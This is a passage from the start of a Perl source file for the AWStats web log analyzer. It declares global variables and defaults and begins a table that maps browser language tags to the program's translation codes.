#!/usr/bin/perl
#------------------------------------------------------------------------------
# Free realtime web server logfile analyzer to show advanced web statistics.
# Works from command line or as a CGI. You must use this script as often as
# necessary from your scheduler to update your statistics and from command
# line or a browser to read report results.
# See AWStats documentation (in docs/ directory) for all setup instructions.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#------------------------------------------------------------------------------
use v5.020;
use strict;
use warnings;
use utf8;
use feature qw(say state);

# Standard Core
use File::Spec;
use POSIX qw(strftime);
use Socket;
use Time::Local;

# Third-Party Modules
use JSON::XS;
use Try::Tiny;

# use Encode;

# Set UTF-8
binmode STDOUT, ':utf8';
binmode STDERR, ':utf8';

# package variable
our %LangHash;
our %translate_map;
our $BrandPlatform;
our $SiteConfig;
our ($REVISION, $VERSION);
our $UseDefaultNotPageList = 0;
our $EnableLocaldatePlugin = 1;
our %DOWNLOAD_EXTS = ();
our %_icon_status = (
	'favicon'       => { '200' => 0, '404' => 0, 'other' => 0 },
	'apple_touch'   => { '200' => 0, '404' => 0, 'other' => 0 },
	'logo'          => { '200' => 0, '404' => 0, 'other' => 0 },
	'webmanifest'   => { '200' => 0, '404' => 0, 'other' => 0 },
	'safari_pinned' => { '200' => 0, '404' => 0, 'other' => 0 },
	'social_icon'   => { '200' => 0, '404' => 0, 'other' => 0 },
	'style_icon'    => { '200' => 0, '404' => 0, 'other' => 0 },
	'core_icon'     => { '200' => 0, '404' => 0, 'other' => 0 },
	'other'         => { '200' => 0, '404' => 0, 'other' => 0 },
);
# Initialization
%LangHash      = ();
%translate_map = ();
$REVISION      = '20260510';
$VERSION       = "8.1 (release $REVISION)";

# ----- constant variable -----
use vars qw/
	$TEST_MODE $DEBUGFORCED $NBOFLINESFORBENCHMARK $FRAMEWIDTH $NBOFLASTUPDATELOOKUPTOSAVE
	$LIMITFLUSH $NEWDAYVISITTIMEOUT $VISITTIMEOUT $NOTSORTEDRECORDTOLERANCE
	$WIDTHCOLICON $TOOLTIPON $NOHTML
	$lastyearbeforeupdate $lastmonthbeforeupdate $lastdaybeforeupdate $lasthourbeforeupdate $lastdatebeforeupdate
/;

# ----- Runtime variable -----
use vars qw/
	$DIR $PROG $Extension $Debug $ShowSteps $DebugResetDone $DNSLookupAlreadyDone
	$RunAsCli $UpdateFor $HeaderHTTPSent $HeaderHTMLSent $LastLine $LastLineNumber
	$LastLineOffset $LastLineChecksum $LastUpdate $lowerval $PluginMode $MetaRobot
	$AverageVisits $AveragePages $AverageHits $AverageBytes $TotalUnique $TotalVisits
	$TotalHostsKnown $TotalHostsUnknown $TotalPages $TotalHits $TotalBytes $TotalHitsErrors
	$TotalNotViewedPages $TotalNotViewedHits $TotalNotViewedBytes $TotalEntries $TotalExits
	$TotalBytesPages $TotalDifferentPages $TotalKeyphrases $TotalKeywords
	$TotalDifferentKeyphrases $TotalDifferentKeywords $TotalSearchEnginesPages $TotalSearchEnginesHits
	$TotalRefererPages $TotalRefererHits $TotalDifferentSearchEngines $TotalDifferentReferer
	$FrameName $Center $FileConfig $FileSuffix $Host $YearRequired $MonthRequired
	$DayRequired $HourRequired $QueryString $SiteConfig $StaticLinks $PageCode $PageDir
	$PerlParsingFormat $PerlParsingFormatJsonMap $UserAgent
	$pos_vh $pos_host $pos_logname $pos_date $pos_tz $pos_method $pos_url $pos_code
	$pos_size $pos_time $pos_referer $pos_agent $pos_query $pos_gzipin $pos_gzipout
	$pos_compratio $pos_timetaken $pos_cluster $pos_emails $pos_emailr $pos_hostr @pos_extra $pos_range
	$DownloadExtList $StreamingExtList $TRACK_STREAMING_FULL_DOWNLOAD
	$FirstTimeforThisHost $host $size $DOWNLOAD_TOOLS_UA_RE $STREAMING_UA_RE $MOBILE_UA_RE $DYNAMIC_URL_RE
/;

# ----- Hash Variable Declaration -----
use vars qw/
	%DOWNLOAD_EXTS %STREAMING_EXTS
/;

# ----- Plugin variable -----
use vars qw/ %PluginsLoaded $PluginDir $AtLeastOneSectionPlugin /;

# ----- Time variable -----
use vars qw/
	$starttime $nowtime $tomorrowtime $nowweekofmonth $nowweekofyear $nowdaymod $nowsmallyear
	$nowsec $nowmin $nowhour $nowday $nowmonth $nowyear $nowwday $nowyday $nowns
	$StartSeconds $StartMicroseconds
/;

# ----- Configuration file reads variables -----
use vars qw/ $FoundNotPageList /;

# ----- Configuration file variables -----
use vars qw/
	$StaticExt $DNSStaticCacheFile $DNSLastUpdateCacheFile $MiscTrackerUrl $Lang
	$MaxRowsInHTMLOutput $MaxLengthOfShownURL $MaxLengthOfStoredURL $MaxLengthOfStoredUA
	$BuildReportFormat $BuildHistoryFormat $ExtraTrackedRowsLimit $DatabaseBreak $SectionsToBeSaved
/;

# ----- Boolean/Switch Variable Group 1 -----
use vars qw/
	$DebugMessages $AllowToUpdateStatsFromBrowser $EnableLockForUpdate $DNSLookup $DynamicDNSLookup
	$AllowAccessFromWebToAuthenticatedUsersOnly $BarHeight $BarWidth $CreateDirDataIfNotExists
	$KeepBackupOfHistoricFiles $NbOfLinesParsed $NbOfLinesDropped $NbOfLinesCorrupted
	$NbOfLinesComment $NbOfLinesBlank $NbOfOldLines $NbOfNewLines $NbOfLinesShowsteps
	$NewLinePhase $NbOfLinesForCorruptedLog $PurgeLogFile $ArchiveLogRecords $ShowDropped
	$ShowCorrupted $ShowUnknownOrigin $ShowDirectOrigin $ShowLinksToWhoIs $ShowAuthenticatedUsers
	$ShowFileSizesStats $ShowRequestTimesStats $ShowScreenSizeStats $ShowSMTPErrorsStats
	$ShowEMailSenders $ShowEMailReceivers $ShowWormsStats $ShowClusterStats
	$IncludeInternalLinksInOriginSection $AuthenticatedUsersNotCaseSensitive $Expires
	$UpdateStats $MigrateStats $URLNotCaseSensitive $URLWithQuery $URLReferrerWithQuery
	$DecodeUA $DecodePunycode
/;

# ----- Show option variable -----
use vars qw/
	$ShowDeviceTypesStats $DetailedReportsOnNewWindows $FirstDayOfWeek $KeyWordsNotSensitive
	$SaveDatabaseFilesWithPermissionsForEveryone $WarningMessages $ShowLinksOnUrl $UseFramesWhenCGI
	$ShowMenu $ShowSummary $ShowMonthStats $ShowDaysOfMonthStats $ShowDaysOfWeekStats
	$ShowHoursStats $ShowDomainsStats $ShowHostsStats $ShowRobotsStats $ShowSessionsStats
	$ShowPagesStats $ShowFileTypesStats $ShowDownloadsStats $ShowOSStats $ShowBrowsersStats
	$ShowOriginStats $ShowProtocolStats $ShowHTTPErrorsStats $ShowHTTPErrorsPageDetail
	$AddDataArrayMonthStats $AddDataArrayShowDaysOfMonthStats $AddDataArrayShowDaysOfWeekStats
	$AddDataArrayShowHoursStats $ShowKeyphrasesStats $ShowKeywordsStats
/;

# ----- Detection level variable -----
use vars qw/
	$AllowFullYearView $LevelForRobotsDetection $LevelForWormsDetection $LevelForBrowsersDetection
	$LevelForOSDetection $LevelForRefererAnalyze $LevelForFileTypesDetection
	$LevelForSearchEnginesDetection $LevelForKeywordsDetection
/;

# ----- Paths and configuration variables -----
use vars qw/
	$DirLock $DirCgi $DirConfig $DirData $DirIcons $DirLang $AWScript $ArchiveFileName
	$AllowAccessFromWebToFollowingIPAddresses $HTMLHeadSection $HTMLEndSection $LinksToWhoIs
	$LinksToIPWhoIs $LogFile $LogType $LogFormat $LogSeparator $Logo $LogoLink $BrandLink $BrandPlatform $StyleSheet
	$WrapperScript $SiteDomain $StatsUrl $UseHTTPSLinkForUrl $URLQuerySeparators $URLWithAnchor
	$ErrorMessages $ShowFlagLinks $AddLinkToExternalCGIWrapper $LogFormatJsonMap
/;

# ----- Color variable -----
use vars qw/
	$color_Background $color_TableBG $color_TableBGRowTitle $color_TableBGTitle $color_TableBorder
	$color_TableRowTitle $color_TableTitle $color_text $color_textpercent $color_titletext
	$color_weekend $color_link $color_hover $color_other $color_h $color_k $color_p $color_e
	$color_x $color_s $color_u $color_v $color_c $color_m $color_t
/;

# ----- Array variable (initialize array) -----
use vars qw/
	@RobotsSearchIDOrder_list1 @RobotsSearchIDOrder_list2 @RobotsSearchIDOrder_listgen
	@SearchEnginesSearchIDOrder_list1 @SearchEnginesSearchIDOrder_list2 @SearchEnginesSearchIDOrder_listgen
	@BrowsersSearchIDOrder @OSSearchIDOrder @WordsToCleanSearchUrl @WormsSearchIDOrder
	@RobotsSearchIDOrder @SearchEnginesSearchIDOrder @_from_p @_from_h @_time_p @_time_h
	@_time_k @_time_nv_p @_time_nv_h @_time_nv_k @DOWIndex @fieldlib @keylist
/;

# ----- Hash and list variables (complex data structures) -----
use vars qw/
	%OSFamily %BrowsersFamily @SessionsRange %SessionsAverage @PayloadRange %PayloadAverage
	@TimeRange %TimeAverage %LangBrowserToLangFile %LangBrowserToLangAwstats
	@HostAliases @AllowAccessFromWebToFollowingAuthenticatedUsers @DefaultFile @SkipDNSLookupFor
	@SkipHosts @SkipUserAgents @SkipFiles @SkipReferrers @NotPageFiles @OnlyHosts
	@OnlyUserAgents @OnlyFiles @OnlyUsers @URLWithQueryWithOnly @URLWithQueryWithout
	@ExtraName @ExtraCondition @ExtraStatTypes @MaxNbOfExtra @MinHitExtra
	@ExtraFirstColumnTitle @ExtraFirstColumnValues @ExtraFirstColumnFunction @ExtraFirstColumnFormat
	@ExtraCodeFilter @ExtraConditionType @ExtraConditionTypeVal @ExtraFirstColumnValuesType
	@ExtraFirstColumnValuesTypeVal @ExtraAddAverageRow @ExtraAddSumRow @PluginsToLoad
/;

# ----- Color status indicator -----
use vars qw/ $color_success $color_error $color_warning /;

# ----- Hashed Array (Complex Hash) -----
use vars qw/
	%BrowsersHashIDLib %BrowsersHashIcon %BrowsersHereAreGrabbers %DomainsHashIDLib
	%MimeHashLib %MimeHashFamily %OSHashID %OSHashLib %RobotsHashIDLib %RobotsAffiliateLib
	%SearchEnginesHashID %SearchEnginesHashLib %SearchEnginesWithKeysNotInQuery
	%SearchEnginesKnownUrl %NotSearchEnginesKeys %WormsHashID %WormsHashLib %WormsHashTarget
	%TmpDomainFullLocation %HTMLOutput %NoLoadPlugin %FilterIn %FilterEx %BadFormatWarning
	%MonthNumLib %ValidHTTPCodes %ValidSMTPCodes %TrapInfosForHTTPErrorCodes %NotPageList
	%DayBytes %DayHits %DayPages %DayVisits %MaxNbOf %MinHit %ListOfYears %HistoryAlreadyFlushed
	%PosInFile %ValueInFile %val %nextval %egal %TmpDNSLookup %TmpOS %TmpRefererServer
	%TmpRobot %TmpBrowser %MyDNSTable %TmpDevice
/;

# ----- Session and Statistical Hash -----
use vars qw/
	%FirstTime %LastTime %MonthHostsKnown %MonthHostsUnknown %MonthUnique %MonthVisits
	%MonthPages %MonthHits %MonthBytes %MonthNotViewedPages %MonthNotViewedHits %MonthNotViewedBytes
	%_session %_browser_h %_browser_p %_filesize %_requesttime %_domener_p %_domener_h
	%_domener_k %_errors_h %_errors_k %_filetypes_h %_filetypes_k %_filetypes_gz_in
	%_filetypes_gz_out %_host_p %_host_h %_host_k %_host_l %_host_s %_host_u %_waithost_e
	%_waithost_l %_waithost_s %_waithost_u %_keyphrases %_keywords %_os_h %_os_p
	%_device_h %_device_p %_mobile_os_h %_mobile_os_p %_pagesrefs_p %_pagesrefs_h
	%_robot_h %_robot_k %_robot_l %_robot_r %_worm_h %_worm_k %_worm_l %_login_h
	%_login_p %_login_k %_login_l %_screensize_h %_icon_status %_protocol_h %_protocol_k
	%_cluster_p %_cluster_h %_cluster_k %_se_referrals_p %_se_referrals_h %_sider_h
	%_referer_h %_err_host_h %_url_p %_url_k %_url_e %_url_x %_downloads %_unknownreferer_l
	%_unknownrefererbrowser_l %_emails_h %_emails_k %_emails_l %_emailr_h %_emailr_k %_emailr_l
/;

# ----- Regular Expression Variables -----
use vars qw/ $regclean1 $regclean2 $regdate /;

# ----- Protocol Codes -----
use vars qw/ %httpcodelib %ftpcodelib %smtpcodelib /;

# ----- Default Message -----
use vars qw/ @Message /;

# ----- Email Statistics Variables -----
use vars qw/
	%_dkim_stats
	%_spf_stats
	%_dmarc_stats
	%_spam_low
	%_spam_high
	%_tls_version
	%_tls_cipher
	%_queue_delay
	%_mail_relay
	%_mail_mta
/;

$DEBUGFORCED = 0;
$NBOFLINESFORBENCHMARK = 8192;
$FRAMEWIDTH = 240;
$NBOFLASTUPDATELOOKUPTOSAVE = 500;
$LIMITFLUSH = 5000;
$NEWDAYVISITTIMEOUT = 764041;
$VISITTIMEOUT = 10000;
$NOTSORTEDRECORDTOLERANCE = 20000;
$WIDTHCOLICON = 'auto';
$TOOLTIPON = 0;
$NOHTML = 0;
$DIR = $PROG = $Extension = '';
$Debug = $ShowSteps = 0;
$DebugResetDone = $DNSLookupAlreadyDone = 0;
$RunAsCli = $UpdateFor = $HeaderHTTPSent = $HeaderHTMLSent = 0;
$LastLine = $LastLineNumber = $LastLineOffset = $LastLineChecksum = 0;
$LastUpdate = 0;
$lowerval = 0;
$PluginMode = '';
$MetaRobot = 0;
$AverageVisits = $AveragePages = $AverageHits = $AverageBytes = 0;
$TotalUnique = $TotalVisits = $TotalHostsKnown = $TotalHostsUnknown = 0;
$TotalPages = $TotalHits = $TotalBytes = $TotalHitsErrors = 0;
$TotalNotViewedPages = $TotalNotViewedHits = $TotalNotViewedBytes = 0;
$TotalEntries = $TotalExits = $TotalBytesPages = $TotalDifferentPages = 0;
$TotalKeyphrases = $TotalKeywords = $TotalDifferentKeyphrases = 0;
$TotalDifferentKeywords = 0;
$TotalSearchEnginesPages = $TotalSearchEnginesHits = $TotalRefererPages = 0;
$TotalRefererHits = $TotalDifferentSearchEngines = $TotalDifferentReferer = 0;

(
	$FrameName,    $Center,       $FileConfig,        $FileSuffix,
	$Host,         $YearRequired, $MonthRequired,     $DayRequired,
	$HourRequired, $QueryString,  $SiteConfig,        $StaticLinks,
	$PageCode,     $PageDir,      $PerlParsingFormat, $UserAgent,
	$PerlParsingFormatJsonMap
) = ( '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', undef );

%PluginsLoaded = ();
$PluginDir = '';
$AtLeastOneSectionPlugin = 0;
$StartSeconds = $StartMicroseconds = 0;
$FoundNotPageList = 0;
$StaticExt = 'html';
$DNSStaticCacheFile = 'dnscache.txt';
$DNSLastUpdateCacheFile = 'dnscachelastupdate.txt';
$MiscTrackerUrl = '/js/awstats_misc_tracker.js';
$Lang = 'auto';
$SectionsToBeSaved = 'all';
$MaxRowsInHTMLOutput = 1000;
$MaxLengthOfShownURL = 64;
$MaxLengthOfStoredURL = 256;
$MaxLengthOfStoredUA = 256;
$BuildReportFormat = 'html';
$BuildHistoryFormat = 'text';
$ExtraTrackedRowsLimit = 500;
$DatabaseBreak = 'month';

(
	$DebugMessages,
	$AllowToUpdateStatsFromBrowser,
	$EnableLockForUpdate,
	$DNSLookup,
	$DynamicDNSLookup,
	$AllowAccessFromWebToAuthenticatedUsersOnly,
	$BarHeight,
	$BarWidth,
	$CreateDirDataIfNotExists,
	$KeepBackupOfHistoricFiles,
	$NbOfLinesParsed,
	$NbOfLinesDropped,
	$NbOfLinesCorrupted,
	$NbOfLinesComment,
	$NbOfLinesBlank,
	$NbOfOldLines,
	$NbOfNewLines,
	$NbOfLinesShowsteps,
	$NewLinePhase,
	$NbOfLinesForCorruptedLog,
	$PurgeLogFile,
	$ArchiveLogRecords,
	$ShowDropped,
	$ShowCorrupted,
	$ShowUnknownOrigin,
	$ShowDirectOrigin,
	$ShowLinksToWhoIs,
	$ShowAuthenticatedUsers,
	$ShowFileSizesStats,
	$ShowRequestTimesStats,
	$ShowScreenSizeStats,
	$ShowSMTPErrorsStats,
	$ShowEMailSenders,
	$ShowEMailReceivers,
	$ShowWormsStats,
	$ShowClusterStats,
	$IncludeInternalLinksInOriginSection,
	$AuthenticatedUsersNotCaseSensitive,
	$Expires,
	$UpdateStats,
	$MigrateStats,
	$URLNotCaseSensitive,
	$URLWithQuery,
	$URLReferrerWithQuery,
	$DecodeUA,
	$DecodePunycode
) = (
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
);

(
	$DetailedReportsOnNewWindows,
	$FirstDayOfWeek,
	$KeyWordsNotSensitive,
	$SaveDatabaseFilesWithPermissionsForEveryone,
	$WarningMessages,
	$ShowLinksOnUrl,
	$UseFramesWhenCGI,
	$ShowMenu,
	$ShowSummary,
	$ShowMonthStats,
	$ShowDaysOfMonthStats,
	$ShowDaysOfWeekStats,
	$ShowHoursStats,
	$ShowDomainsStats,
	$ShowHostsStats,
	$ShowRobotsStats,
	$ShowSessionsStats,
	$ShowPagesStats,
	$ShowFileTypesStats,
	$ShowDownloadsStats,
	$ShowDeviceTypesStats,
	$ShowOSStats,
	$ShowBrowsersStats,
	$ShowOriginStats,
	$ShowKeyphrasesStats,
	$ShowKeywordsStats,
	$ShowProtocolStats,
	$ShowHTTPErrorsStats,
	$ShowHTTPErrorsPageDetail,
	$AddDataArrayMonthStats,
	$AddDataArrayShowDaysOfMonthStats,
	$AddDataArrayShowDaysOfWeekStats,
	$AddDataArrayShowHoursStats
) = (
	1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
	1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1
);

(
	$AllowFullYearView,          $LevelForRobotsDetection,
	$LevelForWormsDetection,     $LevelForBrowsersDetection,
	$LevelForOSDetection,        $LevelForRefererAnalyze,
	$LevelForFileTypesDetection, $LevelForSearchEnginesDetection,
	$LevelForKeywordsDetection
) = (2, 2, 0, 2, 2, 2, 2, 2, 2);

(
	$DirLock,                                  $DirCgi,
	$DirConfig,                                $DirData,
	$DirIcons,                                 $DirLang,
	$AWScript,                                 $ArchiveFileName,
	$AllowAccessFromWebToFollowingIPAddresses, $HTMLHeadSection,
	$HTMLEndSection,                           $LinksToWhoIs,
	$LinksToIPWhoIs,                           $LogFile,
	$LogType,                                  $LogFormat,
	$LogSeparator,                             $Logo,
	$LogoLink,                                 $StyleSheet,
	$WrapperScript,                            $SiteDomain,
	$UseHTTPSLinkForUrl,                       $URLQuerySeparators,
	$URLWithAnchor,                            $ErrorMessages,
	$ShowFlagLinks,                            $AddLinkToExternalCGIWrapper,
	$LogFormatJsonMap,						   $BrandPlatform,
	$BrandLink,								   $StatsUrl
) = (
	'', '', '', '', '', '', '', '', '', '', '', '', '', '',
	'', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''
);

(
	$color_Background,   $color_TableBG,     $color_TableBGRowTitle,
	$color_TableBGTitle, $color_TableBorder, $color_TableRowTitle,
	$color_TableTitle,   $color_text,        $color_textpercent,
	$color_titletext,    $color_weekend,     $color_link,
	$color_hover,        $color_other,       $color_h,
	$color_k,            $color_p,           $color_e,
	$color_x,            $color_s,           $color_u,
	$color_v,            $color_c,           $color_m,
	$color_t
) = (
	'', '', '', '', '', '', '', '', '', '', '', '',
	'', '', '', '', '', '', '', '', '', '', '',
	'', ''
);

@RobotsSearchIDOrder = @SearchEnginesSearchIDOrder = ();
@_from_p = @_from_h = ();
@_time_p = @_time_h = @_time_k = @_time_nv_p = @_time_nv_h = @_time_nv_k = ();
@DOWIndex = @fieldlib = @keylist = ();

@SessionsRange = (
	'0s-30s', '30s-1min',  '1min-2min', '2min-3min', '3min-5min', 
	'5min-10min', '10min-15min', '15min-30min', '30min-45min', 
	'45min-1h', '1h-1.5h', '1.5h-2h', '2h-3h', '3h-4h', '4h-5h', 
	'5h-6h', '6h-8h', '8h-10h', '10h-12h', '12h-18h', '18h-24h', '24h+'
);

%SessionsAverage = (
	'0s-30s'     => 15,
	'30s-1min'   => 45,
	'1min-2min'  => 90,
	'2min-3min'  => 150,
	'3min-5min'  => 240,
	'5min-10min' => 450,
	'10min-15min'=> 750,
	'15min-30min'=> 1350,
	'30min-45min'=> 2250,
	'45min-1h'   => 3150,
	'1h-1.5h'    => 4500,
	'1.5h-2h'    => 6300,
	'2h-3h'      => 9000,
	'3h-4h'      => 12600,
	'4h-5h'      => 16200,
	'5h-6h'      => 19800,
	'6h-8h'      => 25200,
	'8h-10h'     => 32400,
	'10h-12h'    => 39600,
	'12h-18h'    => 54000,
	'18h-24h'    => 75600,
	'24h+'       => 86400,
);

@PayloadRange = ('0-44', '44-100', '100-500', '500-1K', '1K-2K', '2K-5K', '5K+');
%PayloadAverage = (
	'0-44'   => 44,
	'44-100' => 100,
	'100-500'=> 500,
	'500-1K' => 1024,
	'1K-2K'  => 2048,
	'2K-5K'  => 5120,
	'5K+'    => 5121
);

@TimeRange = ('0-44', '44-100', '100-500', '500-1K', '1K-2K', '2K-5K', '5K+');
%TimeAverage = (
	'0-44'   => 44,
	'44-100' => 100,
	'100-500'=> 500,
	'500-1K' => 1024,
	'1K-2K'  => 2048,
	'2K-5K'  => 5120,
	'5K+'    => 5121
);

# -----------------------------------------------------------------------------
# %LangBrowserToLangAwstats - BCP 47 → AWStats internal language mapping
#
# Maps HTTP Accept-Language tags (RFC 5646 / BCP 47) to AWStats internal
# language identifiers used for PO file lookup.
#
# Processing strategies (in order of precedence, like a polite but firm bouncer):
#   1. Exact match       – "you say zh-cn, you get zh-cn"
#   2. Case normalization – "ZH-CN? zh_CN? yeah yeah, we got you"
#   3. Legacy alias       – "iw? we haven't used that since the 90s, here's he"
#   4. Script-based       – "zh-Hans? straight to zh-cn. zh-Hant? zh-tw it is."
#   5. Regional fallback  – "zh-sg? zh-hk? best we can do is zh-cn/zh-tw. don't push it."
#
# Design principles:
#   - No unnecessary translation files (e.g., zh-sg.po)
#   - Cover ≥99% of real-world browser traffic
#   - Prefer practical compatibility over academic precision
#
# See also: RFC 5646, IANA language-subtag-registry, ISO 639-1, ISO 3166-1
# Registry: https://www.iana.org/assignments/language-subtag-registry
# -----------------------------------------------------------------------------
%LangBrowserToLangAwstats = (
	# 简体中文
	'zh'        => 'zh-cn',
	'zh-cn'     => 'zh-cn',
	'zh_cn'     => 'zh-cn',
	'zh-CN'     => 'zh-cn',
	'zh_CN'     => 'zh-cn',
	'cn'        => 'zh-cn',
	'chinese'   => 'zh-cn',
	'zh-hans'   => 'zh-cn',
	'zh_hans'   => 'zh-cn',
	'zh-Hans'   => 'zh-cn',
	'zh_Hans'   => 'zh-cn',
	'zh-sg'     => 'zh-cn',
	'zh_sg'     => 'zh-cn',
	'zh-SG'     => 'zh-cn',
	'zh_SG'     => 'zh-cn',
	
	# 繁體中文
	'zh-tw'     => 'zh-tw',
	'zh_tw'     => 'zh-tw',
	'zh-TW'     => 'zh-tw',
	'zh_TW'     => 'zh-tw',
	'tw'        => 'zh-tw',
	'zh-hant'   => 'zh-tw',
	'zh_hant'   => 'zh-tw',
	'zh-Hant'   => 'zh-tw',
	'zh_Hant'   => 'zh-tw',
	'zh-hk'     => 'zh-tw',
	'zh_hk'     => 'zh-tw',
	'zh-HK'     => 'zh-tw',
	'zh_HK'     => 'zh-tw',
	'zh-mo'     => 'zh-tw',
	'zh_mo'     => 'zh-tw',
	'zh-MO'     => 'zh-tw',
	'zh_MO'     => 'zh-tw',
	
	# Português (Europeu)
	'pt'        => 'pt',
	'pt-pt'     => 'pt',
	'pt_pt'     => 'pt',
	'pt-PT'     => 'pt',
	'pt_PT'     => 'pt',
	'portuguese'=> 'pt',
	
	# Português (Brasil)
	'pt-br'     => 'pt-br',
	'pt_br'     => 'pt-br',
	'pt-BR'     => 'pt-br',
	'pt_BR'     => 'pt-br',
	'brazil'    => 'pt-br',
	
	# Українська
	'uk'        => 'uk',
	'ua'        => 'uk',
	'uk-ua'     => 'uk',
	'uk_ua'     => 'uk',
	'uk-UA'     => 'uk',
	'uk_UA'     => 'uk',
	'ukraine'   => 'uk',   
	'ukrainian' => 'uk',

	# Shqip
	'sq'        => 'sq',
	'al'        => 'sq',
	'albanian'  => 'sq',

	# العربية
	'ar'        => 'ar',
	'arabic'    => 'ar',
	
	# Azərbaycanca
	'az'          => 'az',
	'azerbaijani' => 'az',
	
	# Қазақша
	'kk'        => 'kk',
	'kazakh'    => 'kk',
	
	# Монгол хэл
	'mn'        => 'mn',
	'mongolian' => 'mn',

	# Bahasa Malaysia
	'ms'        => 'ms',
	'malay'     => 'ms',
	
	# Gaeilge
	'ga'        => 'ga',
	'ie'        => 'ga',
	'irish'     => 'ga',
	'gaeilge'   => 'ga',
	
	# Brezhoneg
	'br'        => 'br',
	'bre'       => 'br',
	'breton'    => 'br',
	
	# Cymraeg
	'cy'        => 'cy',
	'wel'       => 'cy',
	'welsh'     => 'cy',
	
	# Galego
	'gl'        => 'gl',
	'glg'       => 'gl',
	'galician'  => 'gl',
	
	# Eesti
	'et'        => 'et',
	'est'       => 'et',
	'estonian'  => 'et',
	
	# Euskara
	'eu'        => 'eu',
	'eus'       => 'eu',
	'baq'       => 'eu',
	'basque'    => 'eu',
	
	# Slovenščina
	'sl'        => 'sl',
	'slv'       => 'sl',
	'slovenian' => 'sl',

	# አማርኛ (Amharic)
	'am'        => 'am',
	'amharic'   => 'am',

	# বাংলা (Bengali)
	'bn'        => 'bn',
	'bd'        => 'bn',
	'bengali'   => 'bn',

	# Български
	'bg'        => 'bg',
	'bulgarian' => 'bg',
	
	# Bosanski
	'bs'        => 'bs',
	'bosnian'   => 'bs',
	'bs-ba'     => 'bs',
	'bs_ba'     => 'bs',
	'bs-BA'     => 'bs',
	'bs_BA'     => 'bs',
	
	# Català
	'ca'        => 'ca',
	'catalan'   => 'ca',
	
	# Čeština
	'cs'        => 'cs',
	'cz'        => 'cs',
	'czech'     => 'cs',
	
	# Deutsch
	'de'        => 'de',
	'german'    => 'de',
	'de-de'     => 'de',
	'de_de'     => 'de',
	'de-DE'     => 'de',
	'de_DE'     => 'de',
	'de-at'     => 'de',
	'de_at'     => 'de',
	'de-AT'     => 'de',
	'de_AT'     => 'de',
	'de-ch'     => 'de',
	'de_ch'     => 'de',
	'de-CH'     => 'de',
	'de_CH'     => 'de',
	
	# Dansk
	'da'        => 'da',
	'dk'        => 'da',
	'danish'    => 'da',
	# en-us
	'en-us'     => 'en-us',
	'en_us'     => 'en-us',
	'en-US'     => 'en-us',
	'en_US'     => 'en-us',
	'english'   => 'en-us',
	'en-usa'    => 'en-us',
	'en-001'    => 'en-us',
	'en'        => 'en-us',
	'en-ph'     => 'en-us',
	'en_ph'     => 'en-us',
	'en-PH'     => 'en-us',
	'en_PH'     => 'en-us',
	'en-hk'     => 'en-us',
	'en_hk'     => 'en-us',
	'en-HK'     => 'en-us',
	'en_HK'     => 'en-us',
	# en-gb
	'en-gb'     => 'en-gb',
	'en_gb'     => 'en-gb',
	'en-GB'     => 'en-gb',
	'en_GB'     => 'en-gb',
	'en-uk'     => 'en-gb',
	'en-eng'    => 'en-gb',
	'en-au'     => 'en-gb',
	'en_au'     => 'en-gb',
	'en-AU'     => 'en-gb',
	'en_AU'     => 'en-gb',
	'en-nz'     => 'en-gb',
	'en_nz'     => 'en-gb',
	'en-NZ'     => 'en-gb',
	'en_NZ'     => 'en-gb',
	'en-ie'     => 'en-gb',
	'en_ie'     => 'en-gb',
	'en-IE'     => 'en-gb',
	'en_IE'     => 'en-gb',
	'en-za'     => 'en-gb',
	'en_za'     => 'en-gb',
	'en-ZA'     => 'en-gb',
	'en_ZA'     => 'en-gb',
	'en-in'     => 'en-gb',
	'en_in'     => 'en-gb',
	'en-IN'     => 'en-gb',
	'en_IN'     => 'en-gb',
	'en-sg'     => 'en-gb',
	'en_sg'     => 'en-gb',
	'en-SG'     => 'en-gb',
	'en_SG'     => 'en-gb',
	'en-my'     => 'en-gb',
	'en_my'     => 'en-gb',
	'en-MY'     => 'en-gb',
	'en_MY'     => 'en-gb',
	# en-ca
	'en-ca'     => 'en-ca',
	'en_ca'     => 'en-ca',
	'en-CA'     => 'en-ca',
	'en_CA'     => 'en-ca',
	
	# Español
	'es'        => 'es',
	'spanish'   => 'es',
	'es-es'     => 'es',
	'es_es'     => 'es',
	'es-ES'     => 'es',
	'es_ES'     => 'es',
	'es-mx'     => 'es',
	'es_mx'     => 'es',
	'es-MX'     => 'es',
	'es_MX'     => 'es',
	'es-ar'     => 'es',
	'es_ar'     => 'es',
	'es-AR'     => 'es',
	'es_AR'     => 'es',
	'es-co'     => 'es',
	'es_co'     => 'es',
	'es-CO'     => 'es',
	'es_CO'     => 'es',
	
	# Ελληνικά
	'el'        => 'el',
	'gr'        => 'el',
	'greek'     => 'el',
	
	# فارسی
	'fa'        => 'fa',
	'fa-ir'     => 'fa',
	'fa_ir'     => 'fa',
	'fa-IR'     => 'fa',
	'fa_IR'     => 'fa',
	'persian'   => 'fa',
	'farsi'     => 'fa',
	
	# Suomi
	'fi'        => 'fi',
	'finnish'   => 'fi',

	# Français
	'fr'        => 'fr',
	'french'    => 'fr',
	'fr-fr'     => 'fr',
	'fr_fr'     => 'fr',
	'fr-FR'     => 'fr',
	'fr_FR'     => 'fr',
	'fr-ca'     => 'fr',
	'fr_ca'     => 'fr',
	'fr-CA'     => 'fr',
	'fr_CA'     => 'fr',
	'fr-be'     => 'fr',
	'fr_be'     => 'fr',
	'fr-BE'     => 'fr',
	'fr_BE'     => 'fr',
	'fr-ch'     => 'fr',
	'fr_ch'     => 'fr',
	'fr-CH'     => 'fr',
	'fr_CH'     => 'fr',
	
	# עברית
	'he'        => 'he',
